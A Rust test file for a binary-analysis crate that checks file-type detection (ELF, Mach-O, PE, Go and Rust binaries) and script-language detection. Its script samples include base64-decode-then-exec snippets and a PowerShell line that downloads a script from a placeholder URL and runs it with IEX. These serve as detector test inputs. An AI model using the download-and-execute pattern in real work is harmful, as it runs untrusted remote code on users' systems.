#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! Tests for language and file type detection (detect.rs, binary.rs detection functions).

use std::path::Path;
use stng::script::detect::{detect_script_language, ScriptLanguage};
use stng::{detect_language, is_go_binary, is_rust_binary, is_text_file};

fn minimal_elf_header() -> Vec<u8> {
    let mut data = vec![0u8; 512];
    data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    data[4] = 2; // 64-bit
    data[5] = 1; // little-endian
    data[6] = 1; // version
    data[16..18].copy_from_slice(&[2, 0]); // ET_EXEC
    data[18..20].copy_from_slice(&[0x3E, 0]); // EM_X86_64
    data[20..24].copy_from_slice(&[1, 0, 0, 0]); // EV_CURRENT
    data
}

#[test]
fn test_detect_language_plain_text() {
    let data = b"Hello, world! This is a plain text file.\n\
                 It has multiple lines and ASCII characters like ABC123.\n\
                 The content is all printable and has no binary markers.";
    assert_eq!(
        detect_language(data),
        "text",
        "ASCII text should be detected as 'text'"
    );
}

#[test]
fn test_detect_language_empty() {
    assert_eq!(
        detect_language(&[]),
        "unknown",
        "Empty data should be 'unknown'"
    );
}

#[test]
fn test_detect_language_all_zeros() {
    let data = vec![0u8; 512];
    assert_eq!(
        detect_language(&data),
        "unknown",
        "All-zero bytes should be 'unknown'"
    );
}

#[test]
fn test_detect_language_elf_no_language_markers() {
    // Minimal ELF without Go or Rust section markers — neither language, but is a binary
    let data = minimal_elf_header();
    assert_eq!(
        detect_language(&data),
        "unknown",
        "ELF without language markers should be 'unknown'"
    );
}

#[test]
fn test_is_text_file_plain_ascii() {
    let data =
        b"This is a plain text file.\nWith multiple lines.\nAnd mostly printable ASCII content.";
    assert!(is_text_file(data), "Plain ASCII should be text");
}

#[test]
fn test_is_text_file_empty() {
    assert!(!is_text_file(&[]), "Empty data is not text");
}

#[test]
fn test_is_text_file_rejects_elf_magic() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    assert!(
        !is_text_file(&data),
        "ELF magic must be rejected as text even if rest is printable"
    );
}

#[test]
fn test_is_text_file_rejects_macho_64bit_le() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCF, 0xFA, 0xED, 0xFE]);
    assert!(
        !is_text_file(&data),
        "64-bit Mach-O LE magic must be rejected as text"
    );
}

#[test]
fn test_is_text_file_rejects_macho_32bit_le() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCE, 0xFA, 0xED, 0xFE]);
    assert!(
        !is_text_file(&data),
        "32-bit Mach-O LE magic must be rejected as text"
    );
}

#[test]
fn test_is_text_file_rejects_fat_macho() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCA, 0xFE, 0xBA, 0xBE]);
    assert!(
        !is_text_file(&data),
        "Fat Mach-O magic must be rejected as text"
    );
}

#[test]
fn test_is_text_file_rejects_pe_mz_header() {
    let mut data = vec![b'A'; 200];
    data[0..2].copy_from_slice(b"MZ");
    assert!(
        !is_text_file(&data),
        "PE MZ header must be rejected as text"
    );
}

#[test]
fn test_is_text_file_rejects_high_binary_ratio() {
    // Cycle through all byte values — far below 85% printable
    let data: Vec<u8> = (0u8..=255).cycle().take(256).collect();
    assert!(
        !is_text_file(&data),
        "Data with many non-printable bytes should not be text"
    );
}

#[test]
fn test_is_text_file_rejects_more_than_two_nulls() {
    let mut data = vec![b'A'; 200];
    data[10] = 0;
    data[50] = 0;
    data[100] = 0; // third null — exceeds the tolerance of 2
    assert!(
        !is_text_file(&data),
        "Data with more than 2 null bytes should not be text"
    );
}

#[test]
fn test_is_text_file_allows_two_nulls() {
    // Exactly 2 null bytes within otherwise printable text should still pass
    let mut data = b"This is printable text content for testing null byte tolerance.".to_vec();
    data.extend(
        b"More content to ensure sample size is sufficient for the 85% threshold test.\n".repeat(3),
    );
    data[20] = 0;
    data[40] = 0;
    assert!(
        is_text_file(&data),
        "Data with exactly 2 null bytes should still be considered text if otherwise printable"
    );
}

#[test]
fn test_is_go_binary_false_for_minimal_elf() {
    let data = minimal_elf_header();
    assert!(
        !is_go_binary(&data),
        "Minimal ELF without .gopclntab or .go.buildinfo should not be Go"
    );
}

#[test]
fn test_is_go_binary_false_for_text() {
    let data = b"Just a plain text string with no binary markers at all.";
    assert!(!is_go_binary(data), "Plain text should not be a Go binary");
}

#[test]
fn test_is_rust_binary_false_for_minimal_elf() {
    let data = minimal_elf_header();
    assert!(
        !is_rust_binary(&data),
        "Minimal ELF without .rustc section should not be Rust"
    );
}

#[test]
fn test_is_rust_binary_false_for_text() {
    let data = b"This is not a Rust binary, just text.";
    assert!(
        !is_rust_binary(data),
        "Plain text should not be a Rust binary"
    );
}

#[test]
fn test_detect_language_with_real_go_binary() {
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/testdata/hello_linux_amd64"
    );
    if !Path::new(path).exists() {
        return; // Skip if fixture not available
    }
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert_eq!(
        detect_language(&data),
        "go",
        "hello_linux_amd64 should be detected as 'go' via .gopclntab marker"
    );
}

#[test]
fn test_is_go_binary_true_for_real_go_binary() {
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/testdata/hello_linux_amd64"
    );
    if !Path::new(path).exists() {
        return;
    }
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert!(
        is_go_binary(&data),
        "hello_linux_amd64 should be identified as a Go binary"
    );
}

#[test]
fn test_is_rust_binary_false_for_go_binary() {
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/testdata/hello_linux_amd64"
    );
    if !Path::new(path).exists() {
        return;
    }
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert!(
        !is_rust_binary(&data),
        "hello_linux_amd64 (Go binary) should not be identified as Rust"
    );
}

#[test]
fn test_script_language_detector_confusion_matrix() {
    let cases = [
        (
            "python imports and defs",
            "import os\nfrom pathlib import Path\n\ndef main():\n    print(Path('ok'))\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "python main guard",
            "#!/usr/bin/env python3\nimport sys\n\nif __name__ == '__main__':\n    print(sys.argv[0])\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "python obfuscation leaning",
            "mod = __import__('base64')\nexec(mod.b64decode('cHJpbnQoMSk='))\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "javascript commonjs",
            "const fs = require('fs');\nfunction main() {\n  console.log(fs.existsSync('ok'));\n}\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "javascript browser style",
            "let value = window.location.href;\ndocument.body.innerHTML = value;\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "javascript obfuscation leaning",
            "var code = atob('YWxlcnQoMSk=');\neval(code);\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "powershell param and env",
            "param($Name)\n$env:TEMP\nWrite-Host $Name\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "powershell encoded style",
            "$data = [Convert]::FromBase64String('QQ==')\nInvoke-Expression ([System.Text.Encoding]::UTF8.GetString($data))\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "powershell webclient style",
            "$wc = New-Object Net.WebClient\n$script = $wc.DownloadString('https://x')\nIEX ($script)\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "lua local function",
            "local function main()\n  print('hello')\nend\nmain()\n",
            None,
        ),
        (
            "lua table iteration",
            "local t = { answer = 42 }\nfor k, v in pairs(t) do\n  print(k, v)\nend\n",
            None,
        ),
        (
            "ruby require and puts",
            "require 'json'\ndef main\n  puts JSON.generate(ok: true)\nend\n",
            None,
        ),
        (
            "ruby block style",
            "items = [1, 2, 3]\nitems.each do |n|\n  puts n\nend\n",
            None,
        ),
        (
            "shell posix",
            "#!/bin/sh\nname=world\necho \"$name\"\nif [ -f /tmp/x ]; then\n  exit 0\nfi\n",
            None,
        ),
        (
            "shell bash function",
            "#!/usr/bin/env bash\nmain() {\n  local file=\"$1\"\n  cat \"$file\"\n}\nmain \"$@\"\n",
            None,
        ),
        (
            "shell pipeline",
            "tmp=$(mktemp)\ncat input.txt | sed 's/x/y/' > \"$tmp\"\nrm -f \"$tmp\"\n",
            None,
        ),
    ];

    for (name, src, expected) in cases {
        assert_eq!(
            detect_script_language(src.as_bytes()),
            expected,
            "{name} sample should not be confused with another detected script language"
        );
    }
}

#[test]
fn test_script_language_detector_ambiguous_examples() {
    let cases = [
        (
            "lua print should not become python",
            "print('hello')\nfor i = 1, 3 do\n  print(i)\nend\n",
            None,
        ),
        (
            "ruby require should not become javascript",
            "require 'openssl'\nputs 'ready'\n",
            None,
        ),
        (
            "shell comments mentioning python should stay shell-like unknown",
            "#!/bin/sh\n# wrapper around python tooling\nprintf '%s\n' 'python helper'\necho done\n",
            None,
        ),
        (
            "javascript eval plus print should stay javascript",
            "const print = console.log;\nlet code = atob('YWxlcnQoMSk=');\neval(code);\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "python exec plus lambda should stay python",
            "import base64\nrunner = lambda s: exec(s)\nrunner(base64.b64decode('cHJpbnQoMSk=').decode())\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "ruby method named eval should not become javascript",
            "def eval(value)\n  puts value\nend\n\neval('hello')\n",
            None,
        ),
        (
            "shell function keyword should not become javascript",
            "#!/bin/bash\nfunction main() {\n  echo hello\n}\nmain\n",
            None,
        ),
        (
            "osascript tell block should stay unsupported",
            "tell application \"Finder\"\n  activate\nend tell\n",
            None,
        ),
        (
            "osascript shell bridge should not become shell or javascript",
            "do shell script \"echo hello\"\ndisplay dialog \"done\"\n",
            None,
        ),
        (
            "powershell with function and echo alias should stay powershell",
            "function Invoke-Task { param($Name) echo $Name }\n$env:TEMP\n",
            Some(ScriptLanguage::PowerShell),
        ),
    ];

    for (name, src, expected) in cases {
        assert_eq!(
            detect_script_language(src.as_bytes()),
            expected,
            "{name} sample resolved unexpectedly"
        );
    }
}
